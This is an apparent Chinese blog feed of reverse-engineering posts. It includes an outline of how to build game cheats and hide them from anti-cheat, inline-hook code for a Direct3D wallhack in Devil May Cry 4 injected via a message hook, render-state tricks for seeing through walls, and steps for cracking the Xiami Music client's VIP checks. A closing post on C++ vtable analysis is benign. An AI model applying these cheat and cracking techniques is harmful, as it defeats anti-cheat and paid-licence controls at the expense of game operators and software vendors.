<li>反调试绕过：（<em>太多了这里不一一陈述</em>）</li>
<li>游戏数据查找：CE搜索，逻辑分析，数据格式 </li>
<li>游戏数据分析：基址及偏移定位，对象属性分析，资源文件分析……</li>
<li>游戏逻辑分析：关键call定位</li>
<li>游戏协议分析：上，下行协议分析</li>
<li>执行时机获取：外部进程感知，独立线程感知，hook感知……</li>
</ul>
</li>
<li><p>外挂编写</p>
<ul>
<li>查找游戏进程<ul>
<li>根据进程名检测</li>
<li>根据窗口名检测</li>
<li>游戏进程句柄</li>
</ul>
</li>
<li>模块注入<ul>
<li>应用层注入（<em>太多啦</em>）</li>
<li>驱动注入</li>
</ul>
</li>
<li>定位游戏数据：<ul>
<li>LoadLibrary\FreeLibrary, GetModuleHandle</li>
<li>特征码查找</li>
</ul>
</li>
<li>数据修改：<ul>
<li>跨进程读写内存（应用层ReadProcessMemory，驱动层DeviceIoControl通信）</li>
<li>修改内存属性+直接读写</li>
<li>修改内存属性+内存拷贝函数</li>
</ul>
</li>
<li>远程调用：<ul>
<li>参数传递</li>
<li>堆栈，上下文环境保护</li>
<li>this指针保护</li>
<li>寄存器，浮点寄存器保护</li>
<li>可能隐藏的参数</li>
</ul>
</li>
<li>外挂隐藏<ul>
<li>断链</li>
<li>VAD树</li>
<li>模拟自加载</li>
</ul>
</li>
<li>躲避检测<ul>
<li>随机进程名，窗口名</li>
<li>进程隐藏</li>
<li>模块隐藏</li>
</ul>
</li>
</ul>
</li>
<li><p>外挂版本维护</p>
</li>
</ul>
<p> （<em>部分内容并没有总结完整，游戏逻辑及自身漏洞尚未总结，因为涉及到对游戏的了解程度，与技术关联不十分密切，所以这里省略，其他部分仍然有很多需要继续完善…</em>）</p>
<p>#后<br>其实从上面的汇总差不多可以看出来游戏安全 跟逆向分析，系统底层及编程能力密切相关。<br>所以我们很容易就能确定出自己的学习方向。<br>希望写到这里能对各位看官起到些许帮助，科普软文，自己总结能力有限，非喜勿喷<br>︿(￣︶￣)︽(￣︶￣)︿飞.飞.飞.</p>
<p><em>本文原创，如需转载，请注明出处 <a href="http://venidic.com/">http://venidic.com/</a></em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前田哒哒问过我关于游戏安全入门的一些建议，后来自己给搞忘记了， 今天没事的时候逛论坛的时候发现了这个问题，于是想想决定总结一下，给之后对游戏安全感兴趣的学弟（或者学妹呃）一些可能的帮助。&lt;br&gt;
    
    </summary>
    
      <category term="游戏安全" scheme="http://venidic.com/categories/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="随笔" scheme="http://venidic.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>D3D透视-D3D HACK</title>
    <link href="http://venidic.com/2015/11/29/HACK/"/>
    <id>http://venidic.com/2015/11/29/HACK/</id>
    <published>2015-11-29T06:31:39.000Z</published>
    <updated>2016-01-02T10:50:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章接着上一篇文章，都是在挺早之前写的，只是最近又看到一篇帖子关于D3D降压透视的，于是乎又回想起之前自己的年幼青涩，于是就顺带把这关于透视的文章在整理一下，做个总结。<br>起先对透视感兴趣，是来自网上的两张图。<br>多么美丽啊，我决定自己也要折腾一个出来：<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc1.jpg" alt="这里写图片描述"><br><a id="more"></a></p>
<p>#环境<br>主机环境：windows7 旗舰版<br>游戏版本：鬼泣4（游民星空）<br>编程环境：vs2012</p>
<p>#D3D Hack<br>这里假设自己拥有基础的d3d图形学的知识，那么分析发现在绘制图形之前，通过顶点缓存，然后调用DrawIndexedPrimitive或者DrawPrimitive来绘制图形。所以通过hook此函数就能感知绘图操作，进而实现我们想要的功能。<br>可以知道Direct3D在内存中的布局为：<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc2.jpg" alt="这里写图片描述"><br>为了得到在win7下的偏移，我们调试下：<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc3.jpg" alt="这里写图片描述"><br>单步到call edx<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc4.jpg" alt="这里写图片描述"><br>此时打开pchunter，查看d3d9.dll所在地址<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc5.jpg" alt="这里写图片描述"><br>通过计算可以得到偏移为：+2B6B1（此偏移只针对win7，不保证其他平台下的偏移是否正确）<br>    我们构造寻址函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HANDLE handle = GetModuleHandle(L&quot;d3d9.dll&quot;);</div><div class="line">    if (handle == INVALID_HANDLE_VALUE)</div><div class="line">    &#123;</div><div class="line">        OutputDebugString(L&quot;get d3d9.dll failed\n&quot;);</div><div class="line">        return NULL;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    return (ULONG_PTR)handle + 0x2B6B1;</div></pre></td></tr></table></figure></p>
<p>构造jmp型hook</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">if(VirtualProtect((LPVOID)g_uladdr,5,PAGE_EXECUTE_READWRITE,&amp;dwoldprotect))</div><div class="line">    &#123;</div><div class="line">        DWORD dwjmp = (DWORD)New_DrawIndexedPrimitive - g_uladdr - 5;</div><div class="line">        _asm</div><div class="line">        &#123;</div><div class="line">            mov eax, g_uladdr   </div><div class="line">            mov byte ptr[eax], 0xe9</div><div class="line">            add eax, 1</div><div class="line">            mov ebx, dwjmp</div><div class="line">            mov dword ptr[eax], ebx</div><div class="line">        &#125;</div><div class="line">        </div><div class="line">    &#125;</div><div class="line">    VirtualProtect((LPVOID)g_uladdr,5,dwoldprotect,&amp;dwoldprotect);</div></pre></td></tr></table></figure>
<p>构造hook函数<br>查找DrawIndexedPrimitive定义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">HRESULT DrawIndexedPrimitive(</div><div class="line">  [in] D3DPRIMITIVETYPE Type,</div><div class="line">  [in] INT              BaseVertexIndex,</div><div class="line">  [in] UINT             MinIndex,</div><div class="line">  [in] UINT             NumVertices,</div><div class="line">  [in] UINT             StartIndex,</div><div class="line">  [in] UINT             PrimitiveCount</div><div class="line">);</div></pre></td></tr></table></figure>
<p>官方给了6个参数，通过调试我们发现，需要将this传进去<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc6.jpg" alt="这里写图片描述"><br>故构造函数如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">HRESULT WINAPI New_DrawIndexedPrimitive(</div><div class="line">    LPDIRECT3DDEVICE9 m_pDevice,</div><div class="line">    D3DPRIMITIVETYPE Type,</div><div class="line">    INT              BaseVertexIndex,</div><div class="line">    UINT             MinIndex,</div><div class="line">    UINT             NumVertices,</div><div class="line">    UINT             StartIndex,</div><div class="line">    UINT             PrimitiveCount</div><div class="line">    )</div><div class="line">&#123;</div><div class="line">//做你想要的功能</div><div class="line">return Old_DrawIndexedPrimitive(m_pDevice, Type,BaseVertexIndex, MinIndex, NumVertices, StartIndex, PrimitiveCount);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>构建跳转<br>分析函数头5个字节<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc7.jpg" alt="这里写图片描述"><br>构建跳转</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">__declspec(naked) HRESULT WINAPI Old_DrawIndexedPrimitive(</div><div class="line">    LPDIRECT3DDEVICE9 m_pDevice,</div><div class="line">    D3DPRIMITIVETYPE Type,</div><div class="line">    INT              BaseVertexIndex,</div><div class="line">    UINT             MinIndex,</div><div class="line">    UINT             NumVertices,</div><div class="line">    UINT             StartIndex,</div><div class="line">    UINT             PrimitiveCount</div><div class="line">    )</div><div class="line">&#123;</div><div class="line">    _asm</div><div class="line">    &#123;</div><div class="line">        mov edi,edi</div><div class="line">        push ebp</div><div class="line">        mov ebp, esp</div><div class="line">        mov eax, g_dwjmpto</div><div class="line">        jmp eax</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>#注入与实现<br>通过windows消息钩子将我们写的dll注入到游戏中<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc8.jpg" alt="这里写图片描述"><br>实现透视<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/dmc9.jpg" alt="这里写图片描述"></p>
<p>#后<br>Direct3D的核心功能集中在IDirect3DDevice9的接口中，只要能hook其中的EndScence(), DrawPrimitive()或DrawIndexedPrimitive()<br>就能感知绘图操作，进而实现我们想要的功能！<br><em>具体代码见<br><a href="https://github.com/venidic/codes/tree/master/Hook/d3d9hook" target="_blank" rel="external">D3D Hook</a><br><a href="https://github.com/venidic/codes/tree/master/Inject/msginject" target="_blank" rel="external">MsgInject</a></em></p>
<p><em>未完待续…</em></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章接着上一篇文章，都是在挺早之前写的，只是最近又看到一篇帖子关于D3D降压透视的，于是乎又回想起之前自己的年幼青涩，于是就顺带把这关于透视的文章在整理一下，做个总结。&lt;br&gt;起先对透视感兴趣，是来自网上的两张图。&lt;br&gt;多么美丽啊，我决定自己也要折腾一个出来：&lt;br&gt;&lt;img src=&quot;http://7xieyq.com1.z0.glb.clouddn.com/dmc1.jpg&quot; alt=&quot;这里写图片描述&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="游戏安全" scheme="http://venidic.com/categories/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="D3D" scheme="http://venidic.com/tags/D3D/"/>
    
  </entry>
  
  <entry>
    <title>D3D透视-透视基础</title>
    <link href="http://venidic.com/2015/11/28/D3D%E9%80%8F%E8%A7%86-%E9%80%8F%E8%A7%86%E5%9F%BA%E7%A1%80/"/>
    <id>http://venidic.com/2015/11/28/D3D透视-透视基础/</id>
    <published>2015-11-28T09:47:20.000Z</published>
    <updated>2016-01-02T10:50:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>#D3D<br>DirectX的功能都是以COM组件的形式提供的。在Direct3D中，主要通过采取以下操作来实现编程：<br>调用适当的函数获取接口指针；<br>调用接口的方法（成员函数）来完成所需功能；<br>用完接口后，调用Release方法进行“释放”，注意释放顺序应该和获取它们的顺序相反。<br>D3D的实现流程：<br>大体可以分为：设计，渲染和显示三个部分。通过设计物体的顶点，贴图，材质等信息，并将坐标转换为屏幕坐标后，调用渲染方式，根据坐标变化，材质文理等计算亮度，进行背面消除，裁剪，投影和视口计算，最后在后备缓冲中绘制好图形交换到当前缓冲区。</p>
<p>#基础知识<br><strong>图元</strong><br>在d3d编程中，所有的图形都是由图元组成的，例如：<br><img src="http://img.blog.csdn.net/20160101175622031" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20160101175636194" alt="这里写图片描述"><br>这些图元分为点列，线列，线带，三角形列，三角形带，三角扇形</p>
<p><strong>顶点缓存</strong><br>顶点缓存通常除顶点坐标之外还包括法线，颜色，纹理等数据。</p>
<p><strong>索引缓存</strong><br>索引缓存就是将顶点的具体数据和代表图元格式的顶点顺序分开存储：顶点数据仍然放到顶点缓存区中，索引缓存区则按照图元格式，顺序存放顶点的索引。<br>例如：<br><img src="http://img.blog.csdn.net/20160101175742135" alt="这里写图片描述"><br>A,B,C,D对应的顶点缓存索引为0 1 2 3，按照三角形的列的组成顺序，把顶点索引值存入索引缓存区，4个三角形分别为△ACB、△ADC、△ABD、△BCD（注意顶点排列顺序和可视面的关系），则索引序列为0 2 1   0 3 2   0 1 3   1 2 3。这样原本要用12个顶点数据构建一个三棱锥，使用索引缓存后，只需要4个。</p>
<p><strong>Z缓存</strong><br>在Direct3D中，使用深度缓存区（Depth Buffer）来进行消隐处理（隐藏面消除），以确保实体被遮挡的部分不被显示。Z缓存是最常用的一种深度缓存，它因为用Z坐标作为判断深度（远近）的依据而得名，其工作原理如图14所示，图中的渲染表面相当于Direct3D窗口，Z缓存用来保存窗口中各个像素的深度。在消隐时，Direct3D先用背景色（或纹理）填充渲染表面，Z缓存则统一设置成最大深度，即投影变换中后裁剪平面的距离，然后逐像素处理渲染表面：对于任意一个像素，Direct3D逐一测试所有与该像素重叠的三角形，如果三角形中像素对应点的Z坐标小于Z缓存中的数值，也就是说，此三角形离观察者较近，则像素取该点的颜色，同时像素在Z缓存中的深度也设为该点的Z坐标，然后继续测试下一个三角形… …<br><img src="http://img.blog.csdn.net/20160101175825857" alt="这里写图片描述"></p>
<p><strong>坐标变换</strong></p>
<ol>
<li>全局转换： 将所有的物体转换为统一的全局坐标，你还可以在这里完成各种对物体位置的操作。</li>
<li>视图转换：转为从观察者（玩家）角度看到的全局坐标。先在全局坐标系的指定位置架一台摄影机，指定一个注视点和一个参考点。坐标将被转换到以摄影机为原点，从原点到 注视点为Z轴，再加上参考点，所确定的平面为Y-Z平面的坐标系中。实际上就是把全局坐标拧了个儿。</li>
<li>透视转换：前两种坐标转换并无本质区别，有些情况就把它们合为一个。而经过透视转换，各顶点的X,Y值将表示实际的屏幕坐标，而Z值就是Z-Buffer里用到的深度信息。</li>
</ol>
<p><strong>渲染</strong><br>在Direct3D中，一个设备对象至少包含两个显示缓存区：当前缓存区（Front Buffer）和后备缓存区（Back Buffer），前者可以看成Direct3D窗口的映射。当我们渲染图形时，实际上并不是直接在窗口上输出，而是在后备缓存区上绘图。渲染完毕后，交换两个缓存区，使原来的后备缓存区变成当前缓存区，从而实现窗口刷新。快速重复此过程，就会在屏幕上形成连续的动画<br><img src="http://img.blog.csdn.net/20160101180005258" alt="这里写图片描述"></p>
<p>有了上述的一些基本概念之后，我们就可以编写出自己的d3d Demo:<br><img src="http://img.blog.csdn.net/20160101180025474" alt="这里写图片描述"></p>
<p>#D3D Hack<br>通过上述了解，我们发现渲染中有个函数SetRenderState()可以设置渲染状态，通过设置不同的参数既可以实现我们想要的功能：<br><strong>透视</strong>：<code>SetRenderState(D3DRS_ZENABLE, FALSE)</code><br><img src="http://img.blog.csdn.net/20160101180110646" alt="这里写图片描述"></p>
<p><strong>去除烟雾</strong>：<br><code>SetRenderState(D3DRS_FOGENABLE, FALSE)</code></p>
<p><strong>设置多边形填充模式</strong>:<br><code>SetRenderState(D3DRS_FILLMODE, D3DFILL_WIREFRAME) //线填充模式，</code>D3D在多边形的每个边绘制一条线<br><img src="http://img.blog.csdn.net/20160101180206710" alt="这里写图片描述"></p>
<p><em>具体代码见<a href="https://github.com/venidic/codes/tree/master/else/d3dDemo" target="_blank" rel="external">D3D demo</a></em></p>
<p><em>未完待续…</em></p>
]]></content>
    
    <summary type="html">
    
      目前大部分游戏通过Direct3D实现3D效果，通过挂钩相应函数，可以实现3D透视，屏幕挂字效果。而透视，屏蔽特定效果，设置透明在很多游戏（特别是FPS）中发挥着巨大的作用！
    
    </summary>
    
      <category term="游戏安全" scheme="http://venidic.com/categories/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="D3D" scheme="http://venidic.com/tags/D3D/"/>
    
  </entry>
  
  <entry>
    <title>虾米音乐vip破解</title>
    <link href="http://venidic.com/2015/11/26/%E8%99%BE%E7%B1%B3%E9%9F%B3%E4%B9%90vip%E7%A0%B4%E8%A7%A3/"/>
    <id>http://venidic.com/2015/11/26/虾米音乐vip破解/</id>
    <published>2015-11-25T16:24:54.000Z</published>
    <updated>2015-11-25T16:55:48.000Z</updated>
    
    <content type="html"><![CDATA[<p>这事起因于最近实在没有听到十分欣喜的歌，于是就开始听中国好声音，后发现虾米音乐买了中国好声音的版权，但是在听歌的时候无奈非会员不可以听高品质的歌曲，这让我感到很生气，为什么要百般刁难我，我不就是想听会歌么。下载了他的客户端（windows端），看了下会员的判定方法，还真发现了一些名堂2333<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20151126003425.jpg" alt="这里写图片描述"><br><a id="more"></a><br>接下来只是简要说明一下crack，因为毕竟是别人家公司的软件，而我们这些假正义（捂脸）的脚本小子肯定不能充当烂好人，随便发破解版。其实懂的人自己动手，不用1个小时，轻松绕过vip。怎么说，应该叫本地破解vip，倒不是web方向改数据库，只是去除了一些会员功能的限制而已。</p>
<p>下载后这个客户端之后，随便看了一下就知道要出事，因为QT写的框架下没有任何保护。逆向界有一句很经典的话叫做<strong>“丢bin就是丢源码”</strong>。正是因为没有任何保护，导致分析起来丝毫不费劲。</p>
<p>在分析之前看了下资源，差不多就发现了一些信息<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20151126004545.jpg" alt="这里写图片描述"></p>
<p>这些肯定是通过之后的加载，来标识了你是否是会员的。</p>
<p>然后OD载入，扫下字符串就发现了很多信息<br><del>这里就不一一列举</del></p>
<p>然后找下就可以定位到对会员的不判定方法，通过将标志传入al，然后进行比较，可以直接给al赋正确的值，或者将之后的跳转nop掉即可。（分别对应着载入时会员的判定，播放时会员的判定，下载时会员的判定，还有一种没有触发）</p>
<p>然后就可以当一把本地会员了<br><img src="http://7xieyq.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20151126005452.jpg" alt="这里写图片描述"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这事起因于最近实在没有听到十分欣喜的歌，于是就开始听中国好声音，后发现虾米音乐买了中国好声音的版权，但是在听歌的时候无奈非会员不可以听高品质的歌曲，这让我感到很生气，为什么要百般刁难我，我不就是想听会歌么。下载了他的客户端（windows端），看了下会员的判定方法，还真发现了一些名堂2333&lt;br&gt;&lt;img src=&quot;http://7xieyq.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20151126003425.jpg&quot; alt=&quot;这里写图片描述&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向分析" scheme="http://venidic.com/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    
    
      <category term="逆向" scheme="http://venidic.com/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="破解" scheme="http://venidic.com/tags/%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>c++虚函数逆向分析</title>
    <link href="http://venidic.com/2015/11/12/c++%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <id>http://venidic.com/2015/11/12/c++虚函数逆向分析/</id>
    <published>2015-11-12T06:48:12.000Z</published>
    <updated>2015-11-22T07:38:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>虚函数表中，主要是一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其真实反应实际的函数。这样，在有虚函数的类的实例中分配了指向这个表的指针的内存，所以，当用父类的指针来操作一个子类的时候，这张虚函数表就显得尤为重要了，它就像一个地图一样，指明了实际所应该调用的函数。<br>虚函数表中，主要是一个类的虚函数的地址表，这张表解决了继承、覆盖的问题，保证其真实反应实际的函数。这样，在有虚函数的类的实例中分配了指向这个表的指针的内存，所以，当用父类的指针来操作一个子类的时候，这张虚函数表就显得尤为重要了，它就像一个地图一样，指明了实际所应该调用的函数。<br><a id="more"></a></p>
<p>#无继承时虚函数表<br>编写demo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">#include &lt;iostream&gt;</div><div class="line">using namespace std;</div><div class="line"></div><div class="line">class base_class</div><div class="line">&#123;</div><div class="line">private:</div><div class="line">	int m_base;</div><div class="line">public:</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func2()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func3()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>OD载入逆向分析<br>构造函数<br><img src="http://img.blog.csdn.net/20151122150501089" alt="这里写图片描述"></p>
<p>我们查看一下虚表指针<br><img src="http://img.blog.csdn.net/20151122150524610" alt="这里写图片描述"></p>
<p>内存中应该为：<br><img src="http://img.blog.csdn.net/20151122150601793" alt="这里写图片描述"></p>
<p>#虚表单一继承：<br>改写demo：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">class base_class</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func2()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func3()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">class dev_class : public base_class</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func4()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class&apos;s v_func4()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func5()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class&apos;s v_func5()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p> 构造函数逆向如下<br>基类构造函数改写指针<br><img src="http://img.blog.csdn.net/20151122150701090" alt="这里写图片描述"><br>此时虚表<br><img src="http://img.blog.csdn.net/20151122150720148" alt="这里写图片描述"><br>在派生类中又改写了虚函数指针<br><img src="http://img.blog.csdn.net/20151122150744298" alt="这里写图片描述"><br>此时虚表<br><img src="http://img.blog.csdn.net/20151122150801188" alt="这里写图片描述"><br>在内存中的布局应该为：<br><img src="http://img.blog.csdn.net/20151122150819734" alt="这里写图片描述"></p>
<p>在改写虚表指针的时候，按照父类-子类的顺序存放在虚表中</p>
<p>#重写父类虚函数继承<br>继续改写demo：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">class base_class</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func2()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class&apos;s v_func3()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">class dev_class : public base_class</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class&apos;s v_func4()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func4()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class&apos;s v_func5()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>OD载入分析构造函数<br>我们按照上述方法打印虚表<br>在构造基类的时候<br><img src="http://img.blog.csdn.net/20151122150921945" alt="这里写图片描述"><br>在派生类修改虚表指针后<br><img src="http://img.blog.csdn.net/20151122150950004" alt="这里写图片描述"></p>
<p>可以很清楚的发现，在第三个虚函数地址被派生类修改<br>内存中布局应该是这样<br> <img src="http://img.blog.csdn.net/20151122151021219" alt="这里写图片描述">  </p>
<p>#多重继承下的虚函数表_子类没有改写父类<br>继续改写demo：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">class base_class_A</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func1()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func2()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_A&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">&#125;;</div><div class="line">class base_class_B</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func3()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_B&apos;s v_func1()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	virtual void v_func4()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is base_class_B&apos;s v_func2()&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">class dev_class : public base_class_A,base_class_B</div><div class="line">&#123;</div><div class="line">public:</div><div class="line">	virtual void v_func5()</div><div class="line">	&#123;</div><div class="line">		cout &lt;&lt; &quot;This is dev_class`s v_func&quot; &lt;&lt; endl;</div><div class="line">	&#125;</div><div class="line">	</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>OD载入分析构造函数<br><img src="http://img.blog.csdn.net/20151122151122615" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20151122151139105" alt="这里写图片描述"><br>Base_a 虚表：<br><img src="http://img.blog.csdn.net/20151122151156329" alt="这里写图片描述"><br>Base_b虚表：<br><img src="http://img.blog.csdn.net/20151122151222827" alt="这里写图片描述"><br>dev虚表<br><img src="http://img.blog.csdn.net/20151122151251870" alt="这里写图片描述"><br>修改虚表指针<br><img src="http://img.blog.csdn.net/20151122151315414" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20151122151338867" alt="这里写图片描述"><br>和<br><img src="http://img.blog.csdn.net/20151122151352483" alt="这里写图片描述"><br>通过分析我们可以发现当<strong>多重</strong>继承中会存在<strong>多张</strong>虚表<br>内存中的布局应该为：<br><img src="http://img.blog.csdn.net/20151122151425264" alt="这里写图片描述"></p>
<p>#多重继承下的虚函数表_子类改写父类</p>
<p>继续改写demo</p>
